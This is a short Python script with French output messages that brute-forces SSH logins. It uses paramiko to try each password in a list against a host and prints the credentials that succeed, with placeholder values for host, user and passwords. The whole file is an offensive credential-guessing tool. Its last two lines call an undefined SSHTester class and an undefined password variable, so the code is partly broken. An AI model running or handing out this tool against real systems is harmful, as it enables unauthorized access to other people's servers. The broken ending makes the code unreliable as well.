import paramiko

class SSHBruteforcer:
    def __init__(self, hostname, username, password_list):
        self.hostname = hostname
        self.username = username
        self.password_list = password_list
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def test_connection(self):
        for password in self.password_list:
            try:
                self.client.connect(self.hostname, username=self.username, password=password)
                print(f"Connexion SSH établie avec succès à {self.hostname} en utilisant le nom d'utilisateur {self.username} et le mot de passe {password}")
                self.client.close()
                return True
            except paramiko.AuthenticationException:
                print(f"Échec de l'authentification SSH pour {self.username} à {self.hostname} avec le mot de passe {password}")
            except Exception as e:
                print(f"Erreur lors de la connexion SSH à {self.hostname}: {str(e)}")
        return False

# Exemple d'utilisation
hostname = "adresse_ip_ou_nom_de_domaine"
username = "nom_utilisateur"
password_list = ["mdp1", "mdp2", "mdp3"]  # Liste de mots de passe à tester

ssh_bruteforcer = SSHBruteforcer(hostname, username, password_list)
ssh_bruteforcer.test_connection()

ssh_tester = SSHTester(hostname, username, password)
ssh_tester.test_connection()
